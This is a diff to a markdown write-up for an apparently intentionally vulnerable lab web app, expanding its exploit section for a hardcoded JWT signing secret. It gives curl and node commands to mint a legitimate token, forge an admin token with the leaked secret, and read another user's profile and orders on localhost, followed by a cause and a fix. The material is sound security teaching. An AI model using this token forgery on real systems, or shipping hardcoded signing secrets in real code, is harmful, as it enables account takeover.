@@ -6,7 +6,18 @@ The JSON API authenticates with JWTs signed with a hardcoded "secret": `jwt-supe
 
 **Code:** `config.js` (`jwtSecret`), `middleware/auth.js` (`requireApiToken`), `routes/api/v1.js` (`/auth/token`)
 
-## Exploit 1: forge a token with the public secret
+## Exploit
+
+1. First, see how tokens are minted legitimately:
+
+```bash
+curl -s -X POST http://localhost:8888/api/v1/auth/token \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"alice123"}'
+# {"token":"eyJhbGciOiJIUzI1NiIs..."}
+```
+
+2. Forge an admin token with the public secret — no credentials needed:
 
 ```bash
 docker compose exec web node -e "
@@ -14,22 +25,23 @@ const jwt = require('jsonwebtoken');
 console.log(jwt.sign({ id: 2, username: 'bob', role: 'admin' }, 'jwt-super-secret', { noTimestamp: true }));"
 ```
 
-Use it:
+3. Use it against the API:
 
 ```bash
 curl -s http://localhost:8888/api/v1/me -H "Authorization: Bearer <forged>"
 # {"id":2,"username":"bob",...}   ← authenticated as bob without ever logging in
+
+curl -s "http://localhost:8888/api/v1/orders?user_id=2" -H "Authorization: Bearer <forged>"
+# bob's orders
 ```
 
-The token even expires in 365 days (`expiresIn: "365d"`), so it outlives password resets.
+The token even expires in 365 days (`expiresIn: "365d"`), so it outlives password resets — there is no reset anyway.
 
-## Exploit 2: weak password → weak token
-
-`POST /api/v1/auth/token` checks credentials in plain text and returns a token — no rate limit, plus the same weak signing secret. Credentials + forgeability means the API never really authenticates anyone.
+4. (Context) The API token endpoint itself has no rate limit and stores passwords in plain text, so credential stuffing works too. But the signing secret makes credentials irrelevant: nothing stops you minting a token for any user id.
 
 ## Why it happens
 
-The token *is* the session. Its security equals the secrecy of the key. Shipping the key in a public repo turns "signed by the server" into "signed by everyone".
+The token *is* the session. Its security equals the secrecy of the key. Shipping the key in a public repo turns "signed by the server" into "signed by everyone". Note `alg=none` is rejected by `jsonwebtoken` v9 by default (it requires a signature) — the real hole here is the weak HMAC secret, which is the more common real-world finding anyway.
 
 ## Fix
 
